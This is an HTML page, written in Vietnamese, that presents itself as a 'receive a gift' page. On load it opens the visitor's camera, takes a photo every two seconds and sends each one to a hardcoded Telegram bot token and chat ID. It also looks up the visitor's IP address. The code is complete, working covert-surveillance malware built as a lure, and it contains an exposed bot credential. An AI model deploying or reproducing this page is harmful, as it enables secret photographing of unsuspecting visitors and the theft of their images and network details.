<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Auto Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }

        #canvas {
            display: none;
        }

        #info {
            margin-top: 20px;
            font-size: 14px;
            text-align: left;
        }
    </style>
</head>
<body>

<h2>Nhận Quà 🎁</h2>
<canvas id="canvas"></canvas>
<div id="info">
    <p><strong>Thông tin hệ thống:</strong></p>
    <p id="battery">Pin: Đang kiểm tra...</p>
    <p id="cpu">CPU: Không khả dụng trên trình duyệt</p>
    <p id="ip">IP: Đang kiểm tra...</p>
    <p id="ping">Ping: Đang kiểm tra...</p>
</div>

<script>
    const telegramBotToken = '7265940405:AAGpjcrDenuCJknXqNTCteXJtrauOUQaDdU';
    const adminChatId = '6735388066'; 

    // Lấy thông tin pin
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            document.getElementById("battery").textContent = `Pin: ${Math.round(battery.level * 100)}%`;
            battery.addEventListener("levelchange", () => {
                document.getElementById("battery").textContent = `Pin: ${Math.round(battery.level * 100)}%`;
            });
        });
    }

    // Lấy địa chỉ IP
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById("ip").textContent = `IP: ${data.ip}`;
        })
        .catch(() => {
            document.getElementById("ip").textContent = "IP: Không thể lấy thông tin.";
        });

    // Lấy thông tin Ping
    function updatePing() {
        const startTime = Date.now();
        fetch('https://www.google.com', { mode: 'no-cors' })
            .then(() => {
                const endTime = Date.now();
                const ping = endTime - startTime;
                document.getElementById("ping").textContent = `Ping: ${ping}ms`;
            })
            .catch(() => {
                document.getElementById("ping").textContent = "Ping: Không khả dụng.";
            });
    }
    setInterval(updatePing, 1000); // Cập nhật ping mỗi giây

    // Mở camera và tự động chụp mỗi 2 giây
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.play();

            videoElement.addEventListener('playing', () => {
                setInterval(() => capturePhoto(videoElement), 2000); // Tự động chụp mỗi 2 giây
            });
        })
        .catch(() => {
            alert('Không thể mở camera!');
        });

    // Chụp ảnh
    function capturePhoto(videoElement) {
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // Thiết lập kích thước canvas phù hợp với video
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;

        // Vẽ ảnh video lên canvas
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg');
        sendImageToTelegram(imageData);
    }

    // Gửi ảnh qua Telegram bot
    function sendImageToTelegram(imageData) {
        const formData = new FormData();
        const blob = dataURLToBlob(imageData);

        formData.append('chat_id', adminChatId);
        formData.append('photo', blob, 'photo.jpg');

        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Ảnh đã được gửi thành công!");
            } else {
                console.error("Lỗi khi gửi ảnh!");
            }
        })
        .catch(() => {
            console.error("Không thể gửi ảnh!");
        });
    }

    // Chuyển Base64 thành Blob
    function dataURLToBlob(dataURL) {
        const byteString = atob(dataURL.split(',')[1]);
        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ua = new Uint8Array(ab);

        for (let i = 0; i < byteString.length; i++) {
            ua[i] = byteString.charCodeAt(i);
        }

        return new Blob([ab], { type: mimeString });
    }
</script>

</body>
</html>
